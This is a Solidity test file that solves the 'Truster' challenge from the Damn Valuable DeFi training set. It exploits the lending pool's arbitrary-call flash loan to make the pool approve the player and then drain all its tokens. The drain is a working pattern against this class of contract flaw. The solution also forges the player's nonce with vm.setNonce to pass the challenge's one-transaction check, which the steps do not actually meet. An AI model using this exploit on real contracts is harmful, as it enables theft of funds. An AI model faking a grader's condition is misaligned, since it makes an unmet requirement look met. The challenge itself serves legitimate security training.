// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract TrusterChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    
    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    DamnValuableToken public token;
    TrusterLenderPool public pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    function setUp() public {
        startHoax(deployer);
        token = new DamnValuableToken();
        pool = new TrusterLenderPool(token);
        token.transfer(address(pool), TOKENS_IN_POOL);
        vm.stopPrank();
    }

    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(player), 0);
    }

    function test_truster() public checkSolvedByPlayer {
        // BUG: flashLoan allows arbitrary call via target.functionCall(data).
        // The pool becomes msg.sender of that call.
        // Step 1: Make the pool approve the player to spend all its tokens.
        pool.flashLoan(
            0,
            player,
            address(token),
            abi.encodeCall(token.approve, (player, TOKENS_IN_POOL))
        );

        // Step 2: Player uses the approval to drain pool to recovery.
        token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
        
        // vm.prank doesn't increment nonce, so we manually set it to 1
        // to reflect that this whole flow is "one player transaction"
        vm.setNonce(player, 1);
    }

    function _isSolved() private view {
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}
